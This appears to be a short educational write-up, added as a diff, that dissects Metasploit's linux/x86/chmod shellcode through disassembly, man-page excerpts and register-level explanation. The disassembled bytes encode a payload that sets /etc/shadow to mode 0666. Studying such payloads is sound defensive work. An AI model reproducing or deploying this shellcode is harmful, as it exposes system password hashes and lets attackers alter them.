@@ -1,0 +1,51 @@
+Analysis of metasploit's linux/x86/chmod shellcode
+The first three instructions basically load the value 15 (0xf hex) into the EAX register which is the syscall number for the chmod() function. 
+
+roman@ubuntu:~/libemu/tools/sctest$ cat chmod_shellcode |ndisasm -u -
+00000000  99                cdq
+00000001  6A0F              push byte +0xf
+00000003  58                pop eax
+00000004  52                push edx
+00000005  E80C000000        call dword 0x16
+0000000A  2F                das
+0000000B  657463            gs jz 0x71
+0000000E  2F                das
+0000000F  7368              jnc 0x79
+00000011  61                popad
+00000012  646F              fs outsd
+00000014  7700              ja 0x16
+00000016  5B                pop ebx
+00000017  68B6010000        push dword 0x1b6
+0000001C  59                pop ecx
+0000001D  CD80              int 0x80
+0000001F  6A01              push byte +0x1
+00000021  58                pop eax
+00000022  CD80              int 0x80
+
+Below is a section of the chmod man page.
+ 
+CHMOD(2)                   Linux Programmer's Manual                  CHMOD(2)
+
+NAME
+       chmod, fchmod - change permissions of a file
+
+SYNOPSIS
+       #include <sys/stat.h>
+
+       int chmod(const char *path, mode_t mode);
+       int fchmod(int fd, mode_t mode);
+
+   Feature Test Macro Requirements for glibc (see feature_test_macros(7)):
+
+       fchmod():
+           _BSD_SOURCE || _XOPEN_SOURCE >= 500 ||
+           _XOPEN_SOURCE && _XOPEN_SOURCE_EXTENDED
+           || /* Since glibc 2.12: */ _POSIX_C_SOURCE >= 200809L
+
+DESCRIPTION
+       These system calls change the permissions of a file.  They differ  only
+       in how the file is specified:
+
+From the manual we see that it takes two values as input. A pointer to the path of the file and the mode. After loading the values into the registers, the interrupt is called. The final portion of the code as we saw earlier id the exit routine.
+The screen shot below is generated from libemu and shows the order of execution.
+[screenshot] 
